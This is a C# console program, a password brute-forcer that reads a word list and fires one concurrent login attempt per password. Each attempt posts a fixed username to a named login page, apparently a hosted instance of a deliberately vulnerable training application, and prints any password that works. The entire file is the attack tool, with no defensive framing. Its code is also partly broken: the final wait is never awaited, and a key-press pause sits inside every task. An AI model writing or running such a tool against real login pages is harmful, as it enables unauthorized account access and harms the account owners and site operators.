using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace Brute_Forcer
{
    class Program
    {
        static void Main(string[] args)
        {
            List<Task> tasklist = new List<Task>();

            List<string> pwdlist = new List<string>(System.IO.File.ReadAllLines("pwdlist.txt"));
            Console.WriteLine("Checking " + pwdlist.Count + " passwords...");
            foreach (string pwd in pwdlist)
            {
                Task CheckTask = new Task(() => CheckPass(pwd));
                CheckTask.Start();
                tasklist.Add(CheckTask);
            }

            Task.WhenAll(tasklist.ToArray());
            Console.WriteLine("Done checking all the passwords");

            Console.ReadKey();
        }


        static void CheckPass(string pwd)
        {
            
            System.Net.CookieContainer myCookies = new System.Net.CookieContainer();
            string mySrc = HttpMethods.get("http://bwapp.bihuo.cn/login.php", "http://bwapp.bihuo.cn/login.php", ref myCookies);     

            string PostData = "login=" + "Quinzo6535" + "&password=" + pwd + "&security_level=0&form=submit";

            bool result = HttpMethods.Post("http://bwapp.bihuo.cn/login.php", PostData, "http://bwapp.bihuo.cn/login.php", myCookies);
            if (result)
                Console.WriteLine("Found password: " + pwd);
            
            Console.ReadKey();
        }
        static string GetBetween(string msg, string start, string stop)
        {
            int startIndex = msg.IndexOf(start) + start.Length;
            int stopIndex = msg.IndexOf(stop);
            return msg.Substring(startIndex, stopIndex - startIndex);
        }
    }
}
